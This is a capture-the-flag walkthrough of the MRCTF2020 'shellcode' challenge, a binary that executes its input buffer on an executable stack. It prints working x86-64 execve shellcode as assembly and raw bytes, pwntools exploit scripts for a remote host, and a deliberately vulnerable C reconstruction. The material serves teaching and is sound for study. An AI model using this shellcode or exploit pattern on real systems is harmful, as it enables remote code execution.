# MRCTF2020 — `shellcode` (BUUCTF, pwn/easy)

A full walkthrough of a classic **shellcode injection** challenge: static analysis,
root-cause of the "bug", a hand-written x86-64 `execve` shellcode (AT&T syntax),
a Python/pwntools exploit for local and remote targets, a reconstructed C source
of the original challenge, mitigations, and a heavy interview-style quiz at the end.

> **Category:** pwn / binary exploitation
> **Difficulty:** Easy
> **Primitive:** Direct execution of attacker-controlled stack memory (`call *rax`)
> **Mitigations present:** PIE, Full RELRO
> **Mitigations missing:** Stack canary, NX (stack is executable / RWX)
> **Author:** Gantosay
---

## Table of Contents

1. [Challenge Files](#1-challenge-files)
2. [Static Analysis](#2-static-analysis)
3. [Disassembly Walkthrough](#3-disassembly-walkthrough)
4. [Finding the Bug — Why `AAAA...` Segfaults](#4-finding-the-bug--why-aaaa-segfaults)
5. [Vulnerability Classification](#5-vulnerability-classification)
6. [Exploit #1 — Using pwntools' `shellcraft.sh()`](#6-exploit-1--using-pwntools-shellcraftsh)
7. [Writing the Shellcode by Hand (Old-School AT&T Assembly)](#7-writing-the-shellcode-by-hand-old-school-att-assembly)
8. [Exploit #2 — Hand-Written Shellcode over SSL/TLS Remote](#8-exploit-2--hand-written-shellcode-over-ssltls-remote)
9. [`shellcraft.sh()` vs. Hand-Written Shellcode](#9-shellcraftsh-vs-hand-written-shellcode)
10. [Reconstructing the Challenge's C Source](#10-reconstructing-the-challenges-c-source)
11. [Root Cause & Mitigations](#11-root-cause--mitigations)
12. [Key Takeaways](#12-key-takeaways)
13. [Interview-Style Quiz](#13-interview-style-quiz)
14. [References](#14-references)

---

## 1. Challenge Files

A single, non-stripped, dynamically linked PIE binary called `shell`.

```text
$ file shell
shell: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV),
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
for GNU/Linux 3.2.0, not stripped
```

```text
$ checksec --file=shell
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

### What each flag means for this exploit

| Flag | Value | Impact |
|---|---|---|
| **RELRO** | Full | GOT is read-only after startup — irrelevant here since we never need to overwrite a GOT entry |
| **Canary** | None | We don't even need a classic stack-smashing overflow, but this confirms there's no integrity check on the stack frame |
| **NX** | **Missing / disabled** | **This is the whole exploit.** The stack segment is marked executable, so code placed there by `read()` can be directly executed by the CPU |
| **PIE** | Enabled | Addresses are randomized at load time, but as we'll see, we never need to know or leak any absolute address |
| **RWX** | Present | Confirms NX is truly off — a segment is simultaneously writable *and* executable, which is normally considered a critical weakness |

---

## 2. Static Analysis

```text
$ ./shell
Show me your magic!
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
[1]    7270 segmentation fault (core dumped)  ./shell
```

```text
$ objdump -s -j .rodata ./shell
 2000 01000200 53686f77 206d6520 796f7572  ....Show me your
 2010 206d6167 69632100                    magic!.
```

Only one interesting string, no hints of a format string, no symbols pointing to
`system`, `/bin/sh`, or a `win()` function. We need to look at the disassembly to
understand what actually happens to our input.

---

## 3. Disassembly Walkthrough

```text
0000000000001155 <main>:
 1155: push   %rbp
 1156: mov    %rsp,%rbp
 1159: sub    $0x410,%rsp              ; stack frame: buf[0x400] + saved int + alignment

 1160: mov    stdin,%rax
 1167: mov    $0x0,%esi
 116c: mov    %rax,%rdi
 116f: call   setbuf@plt               ; setbuf(stdin, NULL)

 1174: mov    stdout,%rax
 ...
 1183: call   setbuf@plt               ; setbuf(stdout, NULL)

 1188: mov    stderr,%rax
 ...
 1197: call   setbuf@plt               ; setbuf(stderr, NULL)

 119c: lea    "Show me your magic!",%rdi
 11a3: call   puts@plt

 11a8: lea    -0x410(%rbp),%rax        ; rax = &buf
 11af: mov    $0x400,%edx              ; count = 1024
 11b4: mov    %rax,%rsi                ; buf
 11b7: mov    $0x0,%edi                ; fd = 0 (stdin)
 11bc: mov    $0x0,%eax
 11c1: call   read@plt                 ; n = read(0, buf, 0x400)

 11c6: mov    %eax,-0x4(%rbp)          ; store n
 11c9: cmpl   $0x0,-0x4(%rbp)
 11cd: jg     11d6                     ; if (n > 0) ...

 11d6: lea    -0x410(%rbp),%rax        ; rax = &buf (again)
 11dd: call   *%rax                    ; <<< buf is executed as machine code >>>

 11df: mov    $0x0,%eax
 11e4: leave
 11e5: ret
```

Translated back to C, `main()` is functionally equivalent to:

```c
int main(void) {
    char buf[0x400];

    setbuf(stdin,  NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    puts("Show me your magic!");

    int n = read(0, buf, 0x400);
    if (n > 0) {
        ((void (*)())buf)();   // directly call the buffer as a function pointer
    }
    return 0;
}
```

**There is no bounds issue, no off-by-one, no format string. The "bug" is a design
decision**: the program reads up to 1024 bytes of attacker input into a buffer and
then **jumps straight into it and starts executing whatever is there**.

---

## 4. Finding the Bug — Why `AAAA...` Segfaults

The crash with `AAAA...` isn't a separate bug — it's a direct symptom of the
`call *rax` above. Here's the memory flow:

```text
      Stack frame of main()
rbp-0x410  ┌────────────────────────┐   <- &buf, where read() starts writing
           │ bytes we sent via      │
           │ read(0, buf, 0x400)    │
rbp-0x00c  └────────────────────────┘
rbp-0x004    n  (return value of read)
rbp          saved rbp
rbp+0x008    return address
```

`read()` copies our raw input, byte for byte, into `buf` starting at offset 0.
Then `call *rax` (with `rax = &buf`) makes the CPU start **fetching and decoding
instructions beginning at the very first byte we sent**.

The ASCII character `'A'` is the byte `0x41`. On x86-64, `0x41` is a **REX prefix**
(it tells the decoder "the next instruction uses an extended register, r8–r15, or
is 64-bit"). A long run of `0x41` bytes makes the CPU chain through REX prefixes
until it finally lands on a byte combination that is either:

* an invalid opcode (`#UD`, illegal instruction), or
* a valid-looking instruction that happens to dereference or jump to garbage
  (e.g. a `jmp`/`call` through a register full of junk).

Either outcome results in the CPU faulting — which the kernel reports as a
**SIGSEGV**, exactly what we observed:

```text
[1]    7270 segmentation fault (core dumped)  ./shell
```

So the fix for *us* isn't to find a different bug — it's to replace `AAAA...`
with **bytes that happen to be valid, useful x86-64 machine code**. That's exactly
what a "shellcode" is.

---

## 5. Vulnerability Classification

* **CWE-94** — Improper Control of Generation of Code ("Code Injection")
* Specifically: **arbitrary shellcode execution via an executable stack segment**
  (sometimes loosely called "shellcode injection" or, informally, a
  "`jmp esp`-less" exploit, since there is no need to hijack a return address or
  leak any address — the program voluntarily jumps into our buffer for us).

This differs fundamentally from classic stack-smashing (`ret2libc`, `ret2shellcode`
via overflow, `ROP`, etc.) in one crucial way: **there is no overflow and no
return-address control needed.** The program computes `&buf` itself (`lea
-0x410(%rbp), %rax`) and jumps there on its own — PIE/ASLR is irrelevant because
we never have to know or guess that address ourselves.

---

## 6. Exploit #1 — Using pwntools' `shellcraft.sh()`

The fastest way to solve this is to let pwntools generate a ready-made shell
spawning payload:

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.os   = 'linux'

# io = process('./shell')                    # local
io = remote('HOST', PORT)                     # remote

shellcode = asm(shellcraft.sh())
log.info(f"shellcode size: {len(shellcode)} bytes")

io.recvuntil(b'magic!')
io.send(shellcode)

io.interactive()
```

Since the buffer is `0x400` (1024) bytes and a typical `shellcraft.sh()` payload is
well under 100 bytes, it fits comfortably. Sending it causes `call *rax` to jump
straight into our shellcode, which calls `execve("/bin/sh", ...)` and drops us
into a shell — locally and remotely.

---

## 7. Writing the Shellcode by Hand (Old-School AT&T Assembly)

For practice (and for interviews, where you're often asked to write shellcode
without a library), here is a minimal, hand-written `execve("/bin//sh", argv,
NULL)` shellcode in **AT&T syntax**, assembled with plain **GNU `as`/`ld`** —
no `nasm`, no pwntools.

### 7.1 The source (`shellcode.s`)

```asm
.global _start

_start:
    # Goal: execve("/bin//sh", argv, NULL)
    # x86-64 syscall number for execve -> 59 (rax = 59)
    # Syscall calling convention:
    #   rdi = pointer to path
    #   rsi = pointer to argv[] (array of pointers, NULL-terminated)
    #   rdx = pointer to envp[] (NULL here)

    xor    %rdx, %rdx                  # rdx = 0  (envp = NULL, also used as our NUL terminator)

    movq   $0x68732f2f6e69622f, %rbx   # 8 bytes: "/bin//sh" (little-endian in memory)
    push   %rdx                        # push NUL terminator first (bottom of the string)
    push   %rbx                        # then push the string itself -> "/bin//sh\0" sits on the stack
    mov    %rsp, %rdi                  # rdi = pointer to "/bin//sh"

    push   %rdx                        # argv[1] = NULL
    push   %rdi                        # argv[0] = pointer to path string
    mov    %rsp, %rsi                  # rsi = pointer to argv[] = { path, NULL }

    xor    %rax, %rax
    mov    $59, %al                    # rax = 59 (SYS_execve) — use al, not eax, to avoid extra zero bytes

    syscall
```

### 7.2 Why `/bin//sh` and not `/bin/sh`?

`movq` loads exactly 8 bytes into a register. `"/bin/sh"` is 7 characters, which
would leave one byte undefined/garbage. Doubling the slash (`"/bin//sh"`, which the
kernel treats identically to `"/bin/sh"`) pads it to exactly 8 bytes so it fits
cleanly into one `movq`.

### 7.3 Why `xor` instead of `mov $0, ...`?

* `xor %rax, %rax` is shorter in machine code than `mov $0x0, %rax` (2–3 bytes vs 5–7).
* More importantly, in shellcode that must avoid NUL bytes entirely (e.g. when read
  via `strcpy`/`gets`/`scanf("%s")`), `mov $0x0, %rax` would embed literal `0x00`
  bytes into the payload, which is a classic way shellcode silently breaks.

### 7.4 Why `mov $59, %al` instead of `%eax`/`%rax`?

`mov $59, %al` only touches the low 8 bits of `rax` and encodes in 2 bytes
(`b0 3b`). Using `%eax` would encode the immediate as 4 bytes, three of which
would be `0x00` — again, extra NUL bytes we'd rather avoid as a matter of good
shellcoding hygiene (even though this specific challenge doesn't require it).

### 7.5 Assembling it (no nasm, no pwntools)

```bash
as --64 shellcode.s -o shellcode.o
ld shellcode.o -o shellcode_bin
objdump -d shellcode_bin          # sanity-check the disassembly
objcopy -O binary -j .text shellcode_bin shellcode.bin
```

Resulting raw bytes (30 bytes total):

```text
48 31 d2                      xor    %rdx,%rdx
48 bb 2f 62 69 6e 2f 2f 73 68 movabs $0x68732f2f6e69622f,%rbx
52                            push   %rdx
53                            push   %rbx
48 89 e7                      mov    %rsp,%rdi
52                            push   %rdx
57                            push   %rdi
48 89 e6                      mov    %rsp,%rsi
48 31 c0                      xor    %rax,%rax
b0 3b                         mov    $0x3b,%al
0f 05                         syscall
```

### 7.6 Proving it works standalone

```bash
$ echo "whoami; echo SHELLCODE_WORKED; exit" | ./shellcode_bin
root
SHELLCODE_WORKED
```

The shellcode genuinely spawns `/bin/sh` and executes the given commands — before
it ever touches the CTF binary.

---

## 8. Exploit #2 — Hand-Written Shellcode over SSL/TLS Remote

Putting the hand-rolled bytes into a full exploit script, targeting a remote
service exposed over TLS (`ncat --ssl`):

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.os   = 'linux'
context.log_level = 'info'

HOST = "example.tcp-ctf.host"
PORT = 9999

# Hand-assembled execve("/bin//sh", argv, NULL):
#   as --64 shellcode.s -o shellcode.o
#   ld shellcode.o -o shellcode_bin
#   objcopy -O binary -j .text shellcode_bin shellcode.bin
shellcode = (
    b"\x48\x31\xd2"               # xor    rdx, rdx
    b"\x48\xbb/bin//sh"           # movabs rbx, "/bin//sh"
    b"\x52"                       # push   rdx
    b"\x53"                       # push   rbx
    b"\x48\x89\xe7"               # mov    rdi, rsp
    b"\x52"                       # push   rdx
    b"\x57"                       # push   rdi
    b"\x48\x89\xe6"               # mov    rsi, rsp
    b"\x48\x31\xc0"               # xor    rax, rax
    b"\xb0\x3b"                   # mov    al, 59
    b"\x0f\x05"                   # syscall
)

log.info(f"shellcode length: {len(shellcode)} bytes")
assert len(shellcode) < 0x400

# equivalent to: ncat --ssl --ssl-servername HOST HOST PORT
io = remote(HOST, PORT, ssl=True, sni=HOST)

io.recvuntil(b"magic!")
io.send(shellcode)

io.interactive()
```

Both the `shellcraft.sh()` version and this manual version worked identically on
the live remote instance.

---

## 9. `shellcraft.sh()` vs. Hand-Written Shellcode

They are **functionally equivalent in goal** (spawn a shell via `execve`), but
**not byte-identical**, and not equally "general purpose":

| | Hand-written (this writeup, 30 bytes) | `shellcraft.sh()` (typically ~44–60+ bytes) |
|---|---|---|
| Core syscall | `execve(rax=59)` | `execve(rax=59)` |
| setuid/setgid awareness | ❌ none | ✅ checks `geteuid() != getuid()`; if the binary is SUID, it calls `setreuid`/`setresuid` so the spawned shell keeps elevated privileges |
| Shell invocation flag | plain `sh` | typically `sh -p` (`-p` tells `dash`/`bash` not to drop privileges even if running setuid — relevant for `busybox`/`dash` targets) |
| Portability | tuned for this one scenario | designed to behave correctly across many target configurations |
| How it's built | `as`/`ld`, AT&T syntax, by hand | pwntools internally shells out to **`nasm`** (Intel syntax) using its own template library, then extracts the raw bytes — conceptually the exact same pipeline we did manually |

**Takeaway:** under the hood, `shellcraft.sh()` is not "magic" — it's doing exactly
what we did (write assembly → assemble → extract bytes), just with a larger,
pre-built template library and extra defensive logic we didn't need here.

---

## 10. Reconstructing the Challenge's C Source

Based on the disassembly, the original source is almost certainly:

```c
#include <stdio.h>
#include <unistd.h>

int main(void)
{
    char buf[1024];     // 0x400
    int  n;

    setbuf(stdin,  NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    puts("Show me your magic!");

    n = read(0, buf, 0x400);
    if (n > 0) {
        void (*shellcode)() = (void (*)())buf;
        shellcode();
    }

    return 0;
}
```

Compiled roughly as:

```bash
gcc -o shell shell.c -fno-stack-protector -z execstack -fcf-protection=none
```

Recompiling this locally and disassembling it reproduces the **same stack frame
size (`0x410`), the same `setbuf`/`puts`/`read` sequence, and the same
`lea`+`call *reg` pattern** seen in the original binary — confirming the
reconstruction. (Minor instruction-selection differences, like `jg` vs `jle`, or
an extra intermediate register move, are explained by differing GCC
versions/optimization levels — the original was built with GCC 9.2.1, per the
`.comment` section strings.)

---

## 11. Root Cause & Mitigations

**Root cause:** the program treats a block of attacker-controlled memory as
*code* instead of *data*, and the stack segment is marked executable (NX
disabled), so nothing prevents the CPU from actually running it.

How this class of bug is normally prevented in real software:

1. **NX / DEP (Data Execution Prevention):** mark stack and heap non-executable.
   This alone would turn this exact exploit into an immediate segfault — the CPU
   would never be allowed to fetch instructions from `buf`.
2. **Never execute a buffer directly.** There is essentially no legitimate reason
   in normal application code to `call` a pointer into a stack buffer filled by
   `read()`. This pattern should not exist outside of JIT compilers, which have
   their own hardening (W^X enforcement, `mprotect` toggling, etc.).
3. **Stack canaries** would not have prevented this specific bug (there's no
   overflow), but they are good general hygiene against adjacent stack-smashing
   bugs.
4. **Seccomp/sandboxing** (e.g. restricting syscalls via `seccomp-bpf`) is a
   common secondary defense in real CTF "pwn" services precisely *because*
   challenges like this exist — it wouldn't stop the crash/overwrite, but it can
   block `execve` even if code execution is achieved, forcing the attacker toward
   an `open`/`read`/`write` (ORW) shellcode instead of a shell.

---

## 12. Key Takeaways

* An executable, writable stack (RWX) turns "we can write arbitrary bytes here"
  directly into "we can run arbitrary code here" — no overflow, no leak, no ROP
  needed.
* PIE/ASLR being enabled is irrelevant when the vulnerable program computes and
  jumps to the buffer's address **itself** — we never need to know that address.
* Garbage input (`AAAA...`) crashes the program not because of a separate bug,
  but because ASCII bytes are, by chance, usually invalid/dangerous as x86-64
  machine code (`0x41` = REX prefix) — this is the same mechanism, working
  against us instead of for us.
* `shellcraft.sh()` is a convenience wrapper around the exact same
  write-assembly → assemble → extract-bytes pipeline you can do by hand with
  `as`/`ld`, plus extra privilege-handling logic.
* Writing shellcode by hand is a core, interview-relevant skill: understanding
  syscall calling conventions, avoiding NUL bytes, and building strings on the
  stack without relying on `.rodata`.

---

## 13. Interview-Style Quiz

<details>
<summary><strong>Q1.</strong> What does "NX" stand for, and what exactly does it prevent? Why didn't it matter that the binary is PIE here?</summary>

**A.** NX stands for **No-eXecute** (also called DEP, Data Execution
Prevention). It's a CPU/MMU feature (via the page table's NX bit) that marks
memory pages as non-executable, so the CPU raises a fault if instructions are
fetched from them — even if the attacker can write arbitrary data there.

PIE (Position Independent Executable) only randomizes **where** code and data
live in memory; it says nothing about **whether** a given page can be executed.
In this challenge, the vulnerable program itself computes `&buf` via
`lea -0x410(%rbp), %rax` and jumps there — so we never need to know or leak the
absolute address ourselves. PIE/ASLR defeats address *guessing* attacks (like
classic ROP/ret2libc without a leak); it does nothing against "the program
hands you code execution directly, at an address it already knows."
</details>

<details>
<summary><strong>Q2.</strong> Why does sending a buffer full of the character <code>'A'</code> cause a segmentation fault here, instead of, say, an infinite loop or a clean return?</summary>

**A.** `'A'` is ASCII `0x41`. On x86-64, `0x41` is a **REX prefix byte**, not a
complete instruction by itself. When the CPU starts decoding at the start of our
buffer and sees a long run of `0x41` bytes, it chains through REX prefixes
(each one modifying how the *next* byte will be interpreted, e.g. enabling
64-bit operand size or extended registers) until it reaches a byte sequence
that either (a) doesn't correspond to any valid instruction (`#UD`, illegal
opcode fault) or (b) does decode into something like a jump/call through a
garbage address. Either way, the CPU ends up faulting, and the kernel delivers
**SIGSEGV** to the process.
</details>

<details>
<summary><strong>Q3.</strong> What is the x86-64 Linux syscall number for <code>execve</code>, and what are its three arguments and which registers hold them (per the syscall ABI, not the C calling convention)?</summary>

**A.** `execve` is syscall number **59** (`rax = 59`). Its arguments, per the
Linux x86-64 **syscall** calling convention (distinct from the standard SysV
function-call ABI used for `call`!), are:

* `rdi` = pointer to the path of the program to execute
* `rsi` = pointer to the `argv[]` array (array of `char*`, NULL-terminated)
* `rdx` = pointer to the `envp[]` array (array of `char*`, NULL-terminated, can
  be NULL)

The instruction `syscall` is then used to trap into the kernel (as opposed to
the older `int 0x80`, which is the 32-bit convention and uses different
register assignments: `ebx, ecx, edx` for args and a different syscall table).
</details>

<details>
<summary><strong>Q4.</strong> Why is <code>"/bin//sh"</code> used instead of <code>"/bin/sh"</code> in hand-written shellcode? Would <code>"/bin/sh\0"</code> padded with a null work just as well?</summary>

**A.** `"/bin/sh"` is 7 bytes; a single `movq $imm64, %reg` instruction loads
exactly 8 bytes. Doubling the slash to `"/bin//sh"` (which the Linux kernel's
path resolver treats identically to a single slash) pads the string to exactly
8 characters so it fits cleanly in one 64-bit immediate move, with no extra
instructions needed.

Padding with an explicit NUL byte (`"/bin/sh\0"`) would also produce 8 bytes
and would technically work the same way — **except** it would embed a literal
`0x00` into the shellcode's machine code. That's fine if the delivery mechanism
tolerates NUL bytes (like this challenge's `read()`), but it would silently
break the payload if it were later delivered through a NUL-terminated input
function like `strcpy`/`gets`/`scanf("%s")`. `"/bin//sh"` avoids the issue
entirely, which is why it's the standard idiom.
</details>

<details>
<summary><strong>Q5.</strong> In the hand-written shellcode, why is <code>mov $59, %al</code> preferred over <code>mov $59, %eax</code> or <code>mov $59, %rax</code>?</summary>

**A.** `%al` is the low 8 bits of `%rax`. `mov $59, %al` encodes as just 2
bytes (`b0 3b`) because the immediate only needs to be 1 byte (59 fits in a
byte) and no register-size prefix is needed. `mov $59, %eax` encodes the
immediate as 4 bytes, and since 59 is small, 3 of those 4 bytes are `0x00` —
unnecessary bulk and, in NUL-sensitive shellcode, unnecessary bugs. Note this
only works because the preceding `xor %rax, %rax` already zeroed out the upper
56 bits of `rax`, so setting just the low byte is sufficient to get `rax = 59`
cleanly.
</details>

<details>
<summary><strong>Q6.</strong> What is the difference between the x86-64 <em>syscall calling convention</em> and the standard <em>SysV AMD64 function-call ABI</em> used for regular <code>call</code> instructions (e.g. to <code>puts</code> or <code>read</code> via the PLT)?</summary>

**A.** For regular C function calls (SysV AMD64 ABI), the first six integer/
pointer arguments go in `rdi, rsi, rdx, rcx, r8, r9`, and the call is made with
the `call` instruction (pushing a return address, which `ret` later pops).

For raw Linux syscalls (`syscall` instruction), the arguments go in
`rdi, rsi, rdx, r10, r8, r9` — note **`r10` replaces `rcx`** as the fourth
argument register. This is because the `syscall` instruction itself clobbers
`rcx` (it's used internally to save the return `rip`) and `r11` (used to save
`rflags`), so the kernel's syscall ABI had to pick a different register for
arg4. This is a very common "gotcha" when porting C-convention intuition
directly to raw syscall shellcoding — glibc wrappers like `read()` or
`execve()` hide this remapping from you.
</details>

<details>
<summary><strong>Q7.</strong> This challenge required no <code>ret2libc</code>, no ROP chain, and no information leak. Explain precisely why, contrasting it with a classic stack buffer overflow that overwrites a saved return address.</summary>

**A.** In a classic stack-smashing overflow, the attacker must:

1. determine the exact offset (padding) between the start of the buffer and the
   saved return address, and
2. know (or leak, if ASLR/PIE is active) the **absolute address** they want
   control flow to jump to — e.g. a libc `system()` address, a ROP gadget
   chain's first address, or a buffer containing shellcode — because *they*
   are the ones constructing the value that overwrites the return address.

In this challenge, there is **no overflow at all**: `read()` only ever writes
within the bounds of `buf`, and the program's own code computes `&buf`
(`lea -0x410(%rbp), %rax`) and performs `call *%rax` using a value it derived
itself from the current stack frame, not from any attacker-supplied address.
Since the "jump target" is always "wherever my own buffer happens to be, right
now, in this frame," PIE/ASLR randomizing that address every run is completely
irrelevant to the attacker — there's nothing to leak, because the program is
guaranteed to jump to the right place regardless of where it is.
</details>

<details>
<summary><strong>Q8.</strong> If <code>seccomp-bpf</code> blocked the <code>execve</code> syscall on the remote server, what alternative exploitation strategy would you use with the same code-execution primitive?</summary>

**A.** Switch to an **ORW (open–read–write)** shellcode: instead of calling
`execve` to spawn a shell, use raw syscalls to:

1. `open("flag.txt", O_RDONLY)` (syscall 2) → get a file descriptor
2. `read(fd, buf, len)` (syscall 0) → read the flag contents into a buffer
3. `write(1, buf, len)` (syscall 1) → print it to stdout (fd 1)

This avoids any syscall that spawns a new process (`execve`, `fork`, etc.),
which is exactly what a seccomp filter blocking "shell-spawning" syscalls is
designed to stop, while still achieving the actual goal (reading the flag) using
syscalls that are rarely blocked.
</details>

<details>
<summary><strong>Q9.</strong> What is "Full RELRO" and why was it irrelevant to this particular exploit?</summary>

**A.** RELRO (Relocation Read-Only) controls whether the Global Offset Table
(GOT) remains writable after the dynamic linker resolves symbols. "Full RELRO"
means the entire GOT is made read-only after startup (as opposed to "Partial
RELRO," which leaves lazily-resolved function entries writable). It's a defense
specifically against **GOT overwrite** attacks, where an attacker with an
arbitrary-write primitive redirects a function pointer like `puts@got` to
`system` or similar. This challenge's exploit never needs to write to the GOT or
hijack a function pointer stored there — code execution is achieved by directly
jumping into a stack buffer the program itself provided — so Full RELRO being
enabled has zero bearing on this particular attack path.
</details>

<details>
<summary><strong>Q10.</strong> Why does <code>xor %reg, %reg</code> get used so often in shellcode instead of <code>mov $0, %reg</code>, beyond just this challenge?</summary>

**A.** Two reasons: (1) **size** — `xor` between two registers of the same size
is typically 2–3 bytes regardless of register width, while `mov` with an
immediate zero still has to encode that immediate, which can add several
`0x00` bytes depending on operand size; (2) **NUL-byte avoidance** — many
shellcode delivery vectors (string-based input functions) terminate on the
first `0x00` byte, so `mov $0, %rax` (which contains multiple literal zero
bytes in its encoding) would truncate the payload early, whereas
`xor %rax, %rax` contains no zero bytes in its own encoding even though its
*result* is zero.
</details>

<details>
<summary><strong>Q11.</strong> What would happen if NX were enabled on this exact binary (all else unchanged)? Walk through exactly where the crash would occur.</summary>

**A.** The vulnerable flow (`read()` into `buf`, then `call *rax` with
`rax = &buf`) would be unchanged — `read()` would still happily write our
shellcode bytes into the stack buffer. The difference happens at
`call *%rax`: the CPU would attempt to **fetch an instruction** from an address
on the stack, see that the page is marked non-executable (NX bit set in the
page table entry), and immediately raise a page fault / general protection
fault, which the kernel turns into SIGSEGV — before executing even a single
byte of our shellcode. In other words, NX would turn this exploit from "full
remote code execution" into "an immediate, useless crash," which is exactly why
NX is considered one of the most important baseline exploit mitigations.
</details>

<details>
<summary><strong>Q12.</strong> In the hand-written shellcode, the string and the argv array are built entirely on the stack at runtime, rather than referencing a fixed address in <code>.rodata</code> (like a normal C program would with a string literal). Why is this necessary for shellcode, specifically?</summary>

**A.** Shellcode is designed to be **position-independent and self-contained** —
it's going to be copied into whatever buffer the vulnerable program happens to
place it in (here, a stack buffer whose address varies every run due to PIE
and ASLR), and it has no linked `.rodata` section of its own to reference by a
fixed offset. If the shellcode tried to reference a string via an absolute
address (like a compiled C binary does), that address would almost certainly be
wrong wherever the shellcode actually ends up executing. By constructing the
string with `push` instructions at runtime, the shellcode builds the data it
needs directly on the stack, right next to where it's currently executing,
using only *relative* addressing (`%rsp`) — making it portable to run correctly
regardless of where in memory it's actually placed.
</details>

<details>
<summary><strong>Q13.</strong> What's the practical difference between how <code>pwntools</code>' <code>shellcraft.sh()</code> shellcode behaves on a SUID binary versus the minimal hand-written version in this writeup?</summary>

**A.** `shellcraft.sh()` includes a runtime check comparing the real and
effective UID/GID (`geteuid()` vs `getuid()`, roughly). If they differ — the
classic signature of a SUID/SGID binary — it calls `setrewid`/`setresuid` (and
the GID equivalents) *before* spawning the shell, so the resulting shell
**retains the elevated effective privileges** instead of the shell dropping
them to the real (unprivileged) user, and it invokes the shell with the `-p`
flag to reinforce that (telling `dash`/`bash` not to self-drop privileges). The
minimal hand-written shellcode in this writeup does none of this — it simply
calls `execve("/bin//sh", ...)` unconditionally. On a non-SUID binary (like
this challenge), the two behave identically. On a SUID-root binary, the
hand-written version could silently lose root privileges in the spawned shell,
while `shellcraft.sh()` is built specifically to avoid that trap.
</details>

<details>
<summary><strong>Q14.</strong> Why does the disassembly show <code>call *%rax</code> instead of a direct <code>call &lt;address&gt;</code>, and what category of x86 instruction is this?</summary>

**A.** `call *%rax` is an **indirect call** — the target address to jump to is
taken from the contents of a register (or, more generally, from memory) at
runtime, rather than being a fixed, compile-time-known address encoded directly
in the instruction (a direct call, e.g. `call 0x1030`). Indirect calls are
necessary here because the compiler cannot know `&buf`'s address at compile
time (it depends on the current stack frame, which itself shifts due to PIE/
ASLR at load time) — the address has to be computed at runtime (via the earlier
`lea -0x410(%rbp), %rax`) and then dereferenced through the register.
Indirect calls/jumps through attacker-influenced registers or memory are also
exactly what modern CPU mitigations like **CET (Control-flow Enforcement
Technology)** and compiler mitigations like **retpolines** are designed to
constrain, though neither is in play in this specific, deliberately
unmitigated CTF binary.
</details>

<details>
<summary><strong>Q15.</strong> How would you confirm, from the disassembly alone, that the original source almost certainly did <em>not</em> use something like <code>system()</code>, <code>strcpy</code>, or a stack-based format string vulnerability?</summary>

**A.** Looking at the PLT (`objdump -d`'s `.plt` section) and the symbol table
(`nm -C ./shell`) shows the **complete set of imported libc functions** the
binary actually calls: only `puts`, `setbuf`, and `read` appear. There is no
`system`, `execve`, `strcpy`, `gets`, `scanf`, `printf`/`sprintf`
(format-string-capable functions), or similar. Combined with the `.rodata`
dump showing only the single literal string `"Show me your magic!"` (no `%s`,
`%x`, `/bin/sh`, or similar format/command strings), this rules out format
string bugs, command injection via `system()`, and any naive
`strcpy`-into-fixed-buffer overflow as the vulnerability class here — leaving
the actual root cause (directly executing a buffer filled by `read()`) as the
only mechanism consistent with the binary's limited import list.
</details>

---

## 14. References

* MRCTF 2020, hosted mirror on BUUCTF ("pwn" category, challenge `[MRCTF2020]shellcode`)
* `man 2 syscall`, `man 2 execve` — Linux syscall ABI reference
* Intel® 64 and IA-32 Architectures Software Developer's Manual, Vol. 2 — instruction
  encoding reference (for the REX prefix discussion in Section 4)
* [pwntools documentation](https://docs.pwntools.com/) — `shellcraft`, `asm()`, `remote()`
